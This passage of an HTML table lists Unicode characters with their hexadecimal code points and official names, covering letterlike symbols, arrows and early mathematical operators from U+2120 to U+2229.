</tr>
<tr>
<td style="text-align:center">℠</td>
<td style="text-align:center">2120</td>
<td style="text-align:center">SERVICE MARK</td>
</tr>
<tr>
<td style="text-align:center">℡</td>
<td style="text-align:center">2121</td>
<td style="text-align:center">TELEPHONE SIGN</td>
</tr>
<tr>
<td style="text-align:center">™</td>
<td style="text-align:center">2122</td>
<td style="text-align:center">TRADE MARK SIGN</td>
</tr>
<tr>
<td style="text-align:center">℣</td>
<td style="text-align:center">2123</td>
<td style="text-align:center">VERSICLE</td>
</tr>
<tr>
<td style="text-align:center">ℤ</td>
<td style="text-align:center">2124</td>
<td style="text-align:center">DOUBLE-STRUCK CAPITAL Z</td>
</tr>
<tr>
<td style="text-align:center">℥</td>
<td style="text-align:center">2125</td>
<td style="text-align:center">OUNCE SIGN</td>
</tr>
<tr>
<td style="text-align:center">Ω</td>
<td style="text-align:center">2126</td>
<td style="text-align:center">OHM SIGN</td>
</tr>
<tr>
<td style="text-align:center">℧</td>
<td style="text-align:center">2127</td>
<td style="text-align:center">INVERTED OHM SIGN</td>
</tr>
<tr>
<td style="text-align:center">ℨ</td>
<td style="text-align:center">2128</td>
<td style="text-align:center">BLACK-LETTER CAPITAL Z</td>
</tr>
<tr>
<td style="text-align:center">℩</td>
<td style="text-align:center">2129</td>
<td style="text-align:center">TURNED GREEK SMALL LETTER IOTA</td>
</tr>
<tr>
<td style="text-align:center">K</td>
<td style="text-align:center">212A</td>
<td style="text-align:center">KELVIN SIGN</td>
</tr>
<tr>
<td style="text-align:center">Å</td>
<td style="text-align:center">212B</td>
<td style="text-align:center">ANGSTROM SIGN</td>
</tr>
<tr>
<td style="text-align:center">ℬ</td>
<td style="text-align:center">212C</td>
<td style="text-align:center">SCRIPT CAPITAL B</td>
</tr>
<tr>
<td style="text-align:center">ℭ</td>
<td style="text-align:center">212D</td>
<td style="text-align:center">BLACK-LETTER CAPITAL C</td>
</tr>
<tr>
<td style="text-align:center">℮</td>
<td style="text-align:center">212E</td>
<td style="text-align:center">ESTIMATED SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ℯ</td>
<td style="text-align:center">212F</td>
<td style="text-align:center">SCRIPT SMALL E</td>
</tr>
<tr>
<td style="text-align:center">ℰ</td>
<td style="text-align:center">2130</td>
<td style="text-align:center">SCRIPT CAPITAL E</td>
</tr>
<tr>
<td style="text-align:center">ℱ</td>
<td style="text-align:center">2131</td>
<td style="text-align:center">SCRIPT CAPITAL F</td>
</tr>
<tr>
<td style="text-align:center">Ⅎ</td>
<td style="text-align:center">2132</td>
<td style="text-align:center">TURNED CAPITAL F</td>
</tr>
<tr>
<td style="text-align:center">ℳ</td>
<td style="text-align:center">2133</td>
<td style="text-align:center">SCRIPT CAPITAL M</td>
</tr>
<tr>
<td style="text-align:center">ℴ</td>
<td style="text-align:center">2134</td>
<td style="text-align:center">SCRIPT SMALL O</td>
</tr>
<tr>
<td style="text-align:center">ℵ</td>
<td style="text-align:center">2135</td>
<td style="text-align:center">ALEF SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ℶ</td>
<td style="text-align:center">2136</td>
<td style="text-align:center">BET SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ℷ</td>
<td style="text-align:center">2137</td>
<td style="text-align:center">GIMEL SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ℸ</td>
<td style="text-align:center">2138</td>
<td style="text-align:center">DALET SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">ℹ</td>
<td style="text-align:center">2139</td>
<td style="text-align:center">INFORMATION SOURCE</td>
</tr>
<tr>
<td style="text-align:center">℺</td>
<td style="text-align:center">213A</td>
<td style="text-align:center">ROTATED CAPITAL Q</td>
</tr>
<tr>
<td style="text-align:center">℻</td>
<td style="text-align:center">213B</td>
<td style="text-align:center">FACSIMILE SIGN</td>
</tr>
<tr>
<td style="text-align:center">ℼ</td>
<td style="text-align:center">213C</td>
<td style="text-align:center">DOUBLE-STRUCK SMALL PI</td>
</tr>
<tr>
<td style="text-align:center">ℽ</td>
<td style="text-align:center">213D</td>
<td style="text-align:center">DOUBLE-STRUCK SMALL GAMMA</td>
</tr>
<tr>
<td style="text-align:center">ℾ</td>
<td style="text-align:center">213E</td>
<td style="text-align:center">DOUBLE-STRUCK CAPITAL GAMMA</td>
</tr>
<tr>
<td style="text-align:center">ℿ</td>
<td style="text-align:center">213F</td>
<td style="text-align:center">DOUBLE-STRUCK CAPITAL PI</td>
</tr>
<tr>
<td style="text-align:center">⅀</td>
<td style="text-align:center">2140</td>
<td style="text-align:center">DOUBLE-STRUCK N-ARY SUMMATION</td>
</tr>
<tr>
<td style="text-align:center">⅁</td>
<td style="text-align:center">2141</td>
<td style="text-align:center">TURNED SANS-SERIF CAPITAL G</td>
</tr>
<tr>
<td style="text-align:center">⅂</td>
<td style="text-align:center">2142</td>
<td style="text-align:center">TURNED SANS-SERIF CAPITAL L</td>
</tr>
<tr>
<td style="text-align:center">⅃</td>
<td style="text-align:center">2143</td>
<td style="text-align:center">REVERSED SANS-SERIF CAPITAL L</td>
</tr>
<tr>
<td style="text-align:center">⅄</td>
<td style="text-align:center">2144</td>
<td style="text-align:center">TURNED SANS-SERIF CAPITAL Y</td>
</tr>
<tr>
<td style="text-align:center">ⅅ</td>
<td style="text-align:center">2145</td>
<td style="text-align:center">DOUBLE-STRUCK ITALIC CAPITAL D</td>
</tr>
<tr>
<td style="text-align:center">ⅆ</td>
<td style="text-align:center">2146</td>
<td style="text-align:center">DOUBLE-STRUCK ITALIC SMALL D</td>
</tr>
<tr>
<td style="text-align:center">ⅇ</td>
<td style="text-align:center">2147</td>
<td style="text-align:center">DOUBLE-STRUCK ITALIC SMALL E</td>
</tr>
<tr>
<td style="text-align:center">ⅈ</td>
<td style="text-align:center">2148</td>
<td style="text-align:center">DOUBLE-STRUCK ITALIC SMALL I</td>
</tr>
<tr>
<td style="text-align:center">ⅉ</td>
<td style="text-align:center">2149</td>
<td style="text-align:center">DOUBLE-STRUCK ITALIC SMALL J</td>
</tr>
<tr>
<td style="text-align:center">⅊</td>
<td style="text-align:center">214A</td>
<td style="text-align:center">PROPERTY LINE</td>
</tr>
<tr>
<td style="text-align:center">⅋</td>
<td style="text-align:center">214B</td>
<td style="text-align:center">TURNED AMPERSAND</td>
</tr>
<tr>
<td style="text-align:center">⅌</td>
<td style="text-align:center">214C</td>
<td style="text-align:center">PER SIGN</td>
</tr>
<tr>
<td style="text-align:center">⅍</td>
<td style="text-align:center">214D</td>
<td style="text-align:center">AKTIESELSKAB</td>
</tr>
<tr>
<td style="text-align:center">ⅎ</td>
<td style="text-align:center">214E</td>
<td style="text-align:center">TURNED SMALL F</td>
</tr>
<tr>
<td style="text-align:center">⅏</td>
<td style="text-align:center">214F</td>
<td style="text-align:center">SYMBOL FOR SAMARITAN SOURCE</td>
</tr>
<tr>
<td style="text-align:center">←</td>
<td style="text-align:center">2190</td>
<td style="text-align:center">LEFTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">↑</td>
<td style="text-align:center">2191</td>
<td style="text-align:center">UPWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">→</td>
<td style="text-align:center">2192</td>
<td style="text-align:center">RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">↓</td>
<td style="text-align:center">2193</td>
<td style="text-align:center">DOWNWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">↔</td>
<td style="text-align:center">2194</td>
<td style="text-align:center">LEFT RIGHT ARROW</td>
</tr>
<tr>
<td style="text-align:center">↕</td>
<td style="text-align:center">2195</td>
<td style="text-align:center">UP DOWN ARROW</td>
</tr>
<tr>
<td style="text-align:center">↖</td>
<td style="text-align:center">2196</td>
<td style="text-align:center">NORTH WEST ARROW</td>
</tr>
<tr>
<td style="text-align:center">↗</td>
<td style="text-align:center">2197</td>
<td style="text-align:center">NORTH EAST ARROW</td>
</tr>
<tr>
<td style="text-align:center">↘</td>
<td style="text-align:center">2198</td>
<td style="text-align:center">SOUTH EAST ARROW</td>
</tr>
<tr>
<td style="text-align:center">↙</td>
<td style="text-align:center">2199</td>
<td style="text-align:center">SOUTH WEST ARROW</td>
</tr>
<tr>
<td style="text-align:center">↚</td>
<td style="text-align:center">219A</td>
<td style="text-align:center">LEFTWARDS ARROW WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">↛</td>
<td style="text-align:center">219B</td>
<td style="text-align:center">RIGHTWARDS ARROW WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">↜</td>
<td style="text-align:center">219C</td>
<td style="text-align:center">LEFTWARDS WAVE ARROW</td>
</tr>
<tr>
<td style="text-align:center">↝</td>
<td style="text-align:center">219D</td>
<td style="text-align:center">RIGHTWARDS WAVE ARROW</td>
</tr>
<tr>
<td style="text-align:center">↞</td>
<td style="text-align:center">219E</td>
<td style="text-align:center">LEFTWARDS TWO HEADED ARROW</td>
</tr>
<tr>
<td style="text-align:center">↟</td>
<td style="text-align:center">219F</td>
<td style="text-align:center">UPWARDS TWO HEADED ARROW</td>
</tr>
<tr>
<td style="text-align:center">↠</td>
<td style="text-align:center">21A0</td>
<td style="text-align:center">RIGHTWARDS TWO HEADED ARROW</td>
</tr>
<tr>
<td style="text-align:center">↡</td>
<td style="text-align:center">21A1</td>
<td style="text-align:center">DOWNWARDS TWO HEADED ARROW</td>
</tr>
<tr>
<td style="text-align:center">↢</td>
<td style="text-align:center">21A2</td>
<td style="text-align:center">LEFTWARDS ARROW WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">↣</td>
<td style="text-align:center">21A3</td>
<td style="text-align:center">RIGHTWARDS ARROW WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">↤</td>
<td style="text-align:center">21A4</td>
<td style="text-align:center">LEFTWARDS ARROW FROM BAR</td>
</tr>
<tr>
<td style="text-align:center">↥</td>
<td style="text-align:center">21A5</td>
<td style="text-align:center">UPWARDS ARROW FROM BAR</td>
</tr>
<tr>
<td style="text-align:center">↦</td>
<td style="text-align:center">21A6</td>
<td style="text-align:center">RIGHTWARDS ARROW FROM BAR</td>
</tr>
<tr>
<td style="text-align:center">↧</td>
<td style="text-align:center">21A7</td>
<td style="text-align:center">DOWNWARDS ARROW FROM BAR</td>
</tr>
<tr>
<td style="text-align:center">↨</td>
<td style="text-align:center">21A8</td>
<td style="text-align:center">UP DOWN ARROW WITH BASE</td>
</tr>
<tr>
<td style="text-align:center">↩</td>
<td style="text-align:center">21A9</td>
<td style="text-align:center">LEFTWARDS ARROW WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">↪</td>
<td style="text-align:center">21AA</td>
<td style="text-align:center">RIGHTWARDS ARROW WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">↫</td>
<td style="text-align:center">21AB</td>
<td style="text-align:center">LEFTWARDS ARROW WITH LOOP</td>
</tr>
<tr>
<td style="text-align:center">↬</td>
<td style="text-align:center">21AC</td>
<td style="text-align:center">RIGHTWARDS ARROW WITH LOOP</td>
</tr>
<tr>
<td style="text-align:center">↭</td>
<td style="text-align:center">21AD</td>
<td style="text-align:center">LEFT RIGHT WAVE ARROW</td>
</tr>
<tr>
<td style="text-align:center">↮</td>
<td style="text-align:center">21AE</td>
<td style="text-align:center">LEFT RIGHT ARROW WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">↯</td>
<td style="text-align:center">21AF</td>
<td style="text-align:center">DOWNWARDS ZIGZAG ARROW</td>
</tr>
<tr>
<td style="text-align:center">↰</td>
<td style="text-align:center">21B0</td>
<td style="text-align:center">UPWARDS ARROW WITH TIP LEFTWARDS</td>
</tr>
<tr>
<td style="text-align:center">↱</td>
<td style="text-align:center">21B1</td>
<td style="text-align:center">UPWARDS ARROW WITH TIP RIGHTWARDS</td>
</tr>
<tr>
<td style="text-align:center">↲</td>
<td style="text-align:center">21B2</td>
<td style="text-align:center">DOWNWARDS ARROW WITH TIP LEFTWARDS</td>
</tr>
<tr>
<td style="text-align:center">↳</td>
<td style="text-align:center">21B3</td>
<td style="text-align:center">DOWNWARDS ARROW WITH TIP RIGHTWARDS</td>
</tr>
<tr>
<td style="text-align:center">↴</td>
<td style="text-align:center">21B4</td>
<td style="text-align:center">RIGHTWARDS ARROW WITH CORNER DOWNWARDS</td>
</tr>
<tr>
<td style="text-align:center">↵</td>
<td style="text-align:center">21B5</td>
<td style="text-align:center">DOWNWARDS ARROW WITH CORNER LEFTWARDS</td>
</tr>
<tr>
<td style="text-align:center">↶</td>
<td style="text-align:center">21B6</td>
<td style="text-align:center">ANTICLOCKWISE TOP SEMICIRCLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">↷</td>
<td style="text-align:center">21B7</td>
<td style="text-align:center">CLOCKWISE TOP SEMICIRCLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">↸</td>
<td style="text-align:center">21B8</td>
<td style="text-align:center">NORTH WEST ARROW TO LONG BAR</td>
</tr>
<tr>
<td style="text-align:center">↹</td>
<td style="text-align:center">21B9</td>
<td style="text-align:center">LEFTWARDS ARROW TO BAR OVER RIGHTWARDS ARROW TO BAR</td>
</tr>
<tr>
<td style="text-align:center">↺</td>
<td style="text-align:center">21BA</td>
<td style="text-align:center">ANTICLOCKWISE OPEN CIRCLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">↻</td>
<td style="text-align:center">21BB</td>
<td style="text-align:center">CLOCKWISE OPEN CIRCLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">↼</td>
<td style="text-align:center">21BC</td>
<td style="text-align:center">LEFTWARDS HARPOON WITH BARB UPWARDS</td>
</tr>
<tr>
<td style="text-align:center">↽</td>
<td style="text-align:center">21BD</td>
<td style="text-align:center">LEFTWARDS HARPOON WITH BARB DOWNWARDS</td>
</tr>
<tr>
<td style="text-align:center">↾</td>
<td style="text-align:center">21BE</td>
<td style="text-align:center">UPWARDS HARPOON WITH BARB RIGHTWARDS</td>
</tr>
<tr>
<td style="text-align:center">↿</td>
<td style="text-align:center">21BF</td>
<td style="text-align:center">UPWARDS HARPOON WITH BARB LEFTWARDS</td>
</tr>
<tr>
<td style="text-align:center">⇀</td>
<td style="text-align:center">21C0</td>
<td style="text-align:center">RIGHTWARDS HARPOON WITH BARB UPWARDS</td>
</tr>
<tr>
<td style="text-align:center">⇁</td>
<td style="text-align:center">21C1</td>
<td style="text-align:center">RIGHTWARDS HARPOON WITH BARB DOWNWARDS</td>
</tr>
<tr>
<td style="text-align:center">⇂</td>
<td style="text-align:center">21C2</td>
<td style="text-align:center">DOWNWARDS HARPOON WITH BARB RIGHTWARDS</td>
</tr>
<tr>
<td style="text-align:center">⇃</td>
<td style="text-align:center">21C3</td>
<td style="text-align:center">DOWNWARDS HARPOON WITH BARB LEFTWARDS</td>
</tr>
<tr>
<td style="text-align:center">⇄</td>
<td style="text-align:center">21C4</td>
<td style="text-align:center">RIGHTWARDS ARROW OVER LEFTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇅</td>
<td style="text-align:center">21C5</td>
<td style="text-align:center">UPWARDS ARROW LEFTWARDS OF DOWNWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇆</td>
<td style="text-align:center">21C6</td>
<td style="text-align:center">LEFTWARDS ARROW OVER RIGHTWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇇</td>
<td style="text-align:center">21C7</td>
<td style="text-align:center">LEFTWARDS PAIRED ARROWS</td>
</tr>
<tr>
<td style="text-align:center">⇈</td>
<td style="text-align:center">21C8</td>
<td style="text-align:center">UPWARDS PAIRED ARROWS</td>
</tr>
<tr>
<td style="text-align:center">⇉</td>
<td style="text-align:center">21C9</td>
<td style="text-align:center">RIGHTWARDS PAIRED ARROWS</td>
</tr>
<tr>
<td style="text-align:center">⇊</td>
<td style="text-align:center">21CA</td>
<td style="text-align:center">DOWNWARDS PAIRED ARROWS</td>
</tr>
<tr>
<td style="text-align:center">⇋</td>
<td style="text-align:center">21CB</td>
<td style="text-align:center">LEFTWARDS HARPOON OVER RIGHTWARDS HARPOON</td>
</tr>
<tr>
<td style="text-align:center">⇌</td>
<td style="text-align:center">21CC</td>
<td style="text-align:center">RIGHTWARDS HARPOON OVER LEFTWARDS HARPOON</td>
</tr>
<tr>
<td style="text-align:center">⇍</td>
<td style="text-align:center">21CD</td>
<td style="text-align:center">LEFTWARDS DOUBLE ARROW WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇎</td>
<td style="text-align:center">21CE</td>
<td style="text-align:center">LEFT RIGHT DOUBLE ARROW WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇏</td>
<td style="text-align:center">21CF</td>
<td style="text-align:center">RIGHTWARDS DOUBLE ARROW WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇐</td>
<td style="text-align:center">21D0</td>
<td style="text-align:center">LEFTWARDS DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇑</td>
<td style="text-align:center">21D1</td>
<td style="text-align:center">UPWARDS DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇒</td>
<td style="text-align:center">21D2</td>
<td style="text-align:center">RIGHTWARDS DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇓</td>
<td style="text-align:center">21D3</td>
<td style="text-align:center">DOWNWARDS DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇔</td>
<td style="text-align:center">21D4</td>
<td style="text-align:center">LEFT RIGHT DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇕</td>
<td style="text-align:center">21D5</td>
<td style="text-align:center">UP DOWN DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇖</td>
<td style="text-align:center">21D6</td>
<td style="text-align:center">NORTH WEST DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇗</td>
<td style="text-align:center">21D7</td>
<td style="text-align:center">NORTH EAST DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇘</td>
<td style="text-align:center">21D8</td>
<td style="text-align:center">SOUTH EAST DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇙</td>
<td style="text-align:center">21D9</td>
<td style="text-align:center">SOUTH WEST DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇚</td>
<td style="text-align:center">21DA</td>
<td style="text-align:center">LEFTWARDS TRIPLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇛</td>
<td style="text-align:center">21DB</td>
<td style="text-align:center">RIGHTWARDS TRIPLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇜</td>
<td style="text-align:center">21DC</td>
<td style="text-align:center">LEFTWARDS SQUIGGLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇝</td>
<td style="text-align:center">21DD</td>
<td style="text-align:center">RIGHTWARDS SQUIGGLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇞</td>
<td style="text-align:center">21DE</td>
<td style="text-align:center">UPWARDS ARROW WITH DOUBLE STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇟</td>
<td style="text-align:center">21DF</td>
<td style="text-align:center">DOWNWARDS ARROW WITH DOUBLE STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇠</td>
<td style="text-align:center">21E0</td>
<td style="text-align:center">LEFTWARDS DASHED ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇡</td>
<td style="text-align:center">21E1</td>
<td style="text-align:center">UPWARDS DASHED ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇢</td>
<td style="text-align:center">21E2</td>
<td style="text-align:center">RIGHTWARDS DASHED ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇣</td>
<td style="text-align:center">21E3</td>
<td style="text-align:center">DOWNWARDS DASHED ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇤</td>
<td style="text-align:center">21E4</td>
<td style="text-align:center">LEFTWARDS ARROW TO BAR</td>
</tr>
<tr>
<td style="text-align:center">⇥</td>
<td style="text-align:center">21E5</td>
<td style="text-align:center">RIGHTWARDS ARROW TO BAR</td>
</tr>
<tr>
<td style="text-align:center">⇦</td>
<td style="text-align:center">21E6</td>
<td style="text-align:center">LEFTWARDS WHITE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇧</td>
<td style="text-align:center">21E7</td>
<td style="text-align:center">UPWARDS WHITE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇨</td>
<td style="text-align:center">21E8</td>
<td style="text-align:center">RIGHTWARDS WHITE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇩</td>
<td style="text-align:center">21E9</td>
<td style="text-align:center">DOWNWARDS WHITE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇪</td>
<td style="text-align:center">21EA</td>
<td style="text-align:center">UPWARDS WHITE ARROW FROM BAR</td>
</tr>
<tr>
<td style="text-align:center">⇫</td>
<td style="text-align:center">21EB</td>
<td style="text-align:center">UPWARDS WHITE ARROW ON PEDESTAL</td>
</tr>
<tr>
<td style="text-align:center">⇬</td>
<td style="text-align:center">21EC</td>
<td style="text-align:center">UPWARDS WHITE ARROW ON PEDESTAL WITH HORIZONTAL BAR</td>
</tr>
<tr>
<td style="text-align:center">⇭</td>
<td style="text-align:center">21ED</td>
<td style="text-align:center">UPWARDS WHITE ARROW ON PEDESTAL WITH VERTICAL BAR</td>
</tr>
<tr>
<td style="text-align:center">⇮</td>
<td style="text-align:center">21EE</td>
<td style="text-align:center">UPWARDS WHITE DOUBLE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇯</td>
<td style="text-align:center">21EF</td>
<td style="text-align:center">UPWARDS WHITE DOUBLE ARROW ON PEDESTAL</td>
</tr>
<tr>
<td style="text-align:center">⇰</td>
<td style="text-align:center">21F0</td>
<td style="text-align:center">RIGHTWARDS WHITE ARROW FROM WALL</td>
</tr>
<tr>
<td style="text-align:center">⇱</td>
<td style="text-align:center">21F1</td>
<td style="text-align:center">NORTH WEST ARROW TO CORNER</td>
</tr>
<tr>
<td style="text-align:center">⇲</td>
<td style="text-align:center">21F2</td>
<td style="text-align:center">SOUTH EAST ARROW TO CORNER</td>
</tr>
<tr>
<td style="text-align:center">⇳</td>
<td style="text-align:center">21F3</td>
<td style="text-align:center">UP DOWN WHITE ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇴</td>
<td style="text-align:center">21F4</td>
<td style="text-align:center">RIGHT ARROW WITH SMALL CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">⇵</td>
<td style="text-align:center">21F5</td>
<td style="text-align:center">DOWNWARDS ARROW LEFTWARDS OF UPWARDS ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇶</td>
<td style="text-align:center">21F6</td>
<td style="text-align:center">THREE RIGHTWARDS ARROWS</td>
</tr>
<tr>
<td style="text-align:center">⇷</td>
<td style="text-align:center">21F7</td>
<td style="text-align:center">LEFTWARDS ARROW WITH VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇸</td>
<td style="text-align:center">21F8</td>
<td style="text-align:center">RIGHTWARDS ARROW WITH VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇹</td>
<td style="text-align:center">21F9</td>
<td style="text-align:center">LEFT RIGHT ARROW WITH VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇺</td>
<td style="text-align:center">21FA</td>
<td style="text-align:center">LEFTWARDS ARROW WITH DOUBLE VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇻</td>
<td style="text-align:center">21FB</td>
<td style="text-align:center">RIGHTWARDS ARROW WITH DOUBLE VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇼</td>
<td style="text-align:center">21FC</td>
<td style="text-align:center">LEFT RIGHT ARROW WITH DOUBLE VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⇽</td>
<td style="text-align:center">21FD</td>
<td style="text-align:center">LEFTWARDS OPEN-HEADED ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇾</td>
<td style="text-align:center">21FE</td>
<td style="text-align:center">RIGHTWARDS OPEN-HEADED ARROW</td>
</tr>
<tr>
<td style="text-align:center">⇿</td>
<td style="text-align:center">21FF</td>
<td style="text-align:center">LEFT RIGHT OPEN-HEADED ARROW</td>
</tr>
<tr>
<td style="text-align:center">∀</td>
<td style="text-align:center">2200</td>
<td style="text-align:center">FOR ALL</td>
</tr>
<tr>
<td style="text-align:center">∁</td>
<td style="text-align:center">2201</td>
<td style="text-align:center">COMPLEMENT</td>
</tr>
<tr>
<td style="text-align:center">∂</td>
<td style="text-align:center">2202</td>
<td style="text-align:center">PARTIAL DIFFERENTIAL</td>
</tr>
<tr>
<td style="text-align:center">∃</td>
<td style="text-align:center">2203</td>
<td style="text-align:center">THERE EXISTS</td>
</tr>
<tr>
<td style="text-align:center">∄</td>
<td style="text-align:center">2204</td>
<td style="text-align:center">THERE DOES NOT EXIST</td>
</tr>
<tr>
<td style="text-align:center">∅</td>
<td style="text-align:center">2205</td>
<td style="text-align:center">EMPTY SET</td>
</tr>
<tr>
<td style="text-align:center">∆</td>
<td style="text-align:center">2206</td>
<td style="text-align:center">INCREMENT</td>
</tr>
<tr>
<td style="text-align:center">∇</td>
<td style="text-align:center">2207</td>
<td style="text-align:center">NABLA</td>
</tr>
<tr>
<td style="text-align:center">∈</td>
<td style="text-align:center">2208</td>
<td style="text-align:center">ELEMENT OF</td>
</tr>
<tr>
<td style="text-align:center">∉</td>
<td style="text-align:center">2209</td>
<td style="text-align:center">NOT AN ELEMENT OF</td>
</tr>
<tr>
<td style="text-align:center">∊</td>
<td style="text-align:center">220A</td>
<td style="text-align:center">SMALL ELEMENT OF</td>
</tr>
<tr>
<td style="text-align:center">∋</td>
<td style="text-align:center">220B</td>
<td style="text-align:center">CONTAINS AS MEMBER</td>
</tr>
<tr>
<td style="text-align:center">∌</td>
<td style="text-align:center">220C</td>
<td style="text-align:center">DOES NOT CONTAIN AS MEMBER</td>
</tr>
<tr>
<td style="text-align:center">∍</td>
<td style="text-align:center">220D</td>
<td style="text-align:center">SMALL CONTAINS AS MEMBER</td>
</tr>
<tr>
<td style="text-align:center">∎</td>
<td style="text-align:center">220E</td>
<td style="text-align:center">END OF PROOF</td>
</tr>
<tr>
<td style="text-align:center">∏</td>
<td style="text-align:center">220F</td>
<td style="text-align:center">N-ARY PRODUCT</td>
</tr>
<tr>
<td style="text-align:center">∐</td>
<td style="text-align:center">2210</td>
<td style="text-align:center">N-ARY COPRODUCT</td>
</tr>
<tr>
<td style="text-align:center">∑</td>
<td style="text-align:center">2211</td>
<td style="text-align:center">N-ARY SUMMATION</td>
</tr>
<tr>
<td style="text-align:center">−</td>
<td style="text-align:center">2212</td>
<td style="text-align:center">MINUS SIGN</td>
</tr>
<tr>
<td style="text-align:center">∓</td>
<td style="text-align:center">2213</td>
<td style="text-align:center">MINUS-OR-PLUS SIGN</td>
</tr>
<tr>
<td style="text-align:center">∔</td>
<td style="text-align:center">2214</td>
<td style="text-align:center">DOT PLUS</td>
</tr>
<tr>
<td style="text-align:center">∕</td>
<td style="text-align:center">2215</td>
<td style="text-align:center">DIVISION SLASH</td>
</tr>
<tr>
<td style="text-align:center">∖</td>
<td style="text-align:center">2216</td>
<td style="text-align:center">SET MINUS</td>
</tr>
<tr>
<td style="text-align:center">∗</td>
<td style="text-align:center">2217</td>
<td style="text-align:center">ASTERISK OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">∘</td>
<td style="text-align:center">2218</td>
<td style="text-align:center">RING OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">∙</td>
<td style="text-align:center">2219</td>
<td style="text-align:center">BULLET OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">√</td>
<td style="text-align:center">221A</td>
<td style="text-align:center">SQUARE ROOT</td>
</tr>
<tr>
<td style="text-align:center">∛</td>
<td style="text-align:center">221B</td>
<td style="text-align:center">CUBE ROOT</td>
</tr>
<tr>
<td style="text-align:center">∜</td>
<td style="text-align:center">221C</td>
<td style="text-align:center">FOURTH ROOT</td>
</tr>
<tr>
<td style="text-align:center">∝</td>
<td style="text-align:center">221D</td>
<td style="text-align:center">PROPORTIONAL TO</td>
</tr>
<tr>
<td style="text-align:center">∞</td>
<td style="text-align:center">221E</td>
<td style="text-align:center">INFINITY</td>
</tr>
<tr>
<td style="text-align:center">∟</td>
<td style="text-align:center">221F</td>
<td style="text-align:center">RIGHT ANGLE</td>
</tr>
<tr>
<td style="text-align:center">∠</td>
<td style="text-align:center">2220</td>
<td style="text-align:center">ANGLE</td>
</tr>
<tr>
<td style="text-align:center">∡</td>
<td style="text-align:center">2221</td>
<td style="text-align:center">MEASURED ANGLE</td>
</tr>
<tr>
<td style="text-align:center">∢</td>
<td style="text-align:center">2222</td>
<td style="text-align:center">SPHERICAL ANGLE</td>
</tr>
<tr>
<td style="text-align:center">∣</td>
<td style="text-align:center">2223</td>
<td style="text-align:center">DIVIDES</td>
</tr>
<tr>
<td style="text-align:center">∤</td>
<td style="text-align:center">2224</td>
<td style="text-align:center">DOES NOT DIVIDE</td>
</tr>
<tr>
<td style="text-align:center">∥</td>
<td style="text-align:center">2225</td>
<td style="text-align:center">PARALLEL TO</td>
</tr>
<tr>
<td style="text-align:center">∦</td>
<td style="text-align:center">2226</td>
<td style="text-align:center">NOT PARALLEL TO</td>
</tr>
<tr>
<td style="text-align:center">∧</td>
<td style="text-align:center">2227</td>
<td style="text-align:center">LOGICAL AND</td>
</tr>
<tr>
<td style="text-align:center">∨</td>
<td style="text-align:center">2228</td>
<td style="text-align:center">LOGICAL OR</td>
</tr>
<tr>
<td style="text-align:center">∩</td>
<td style="text-align:center">2229</td>
<td style="text-align:center">INTERSECTION</td>
</tr>
<tr>
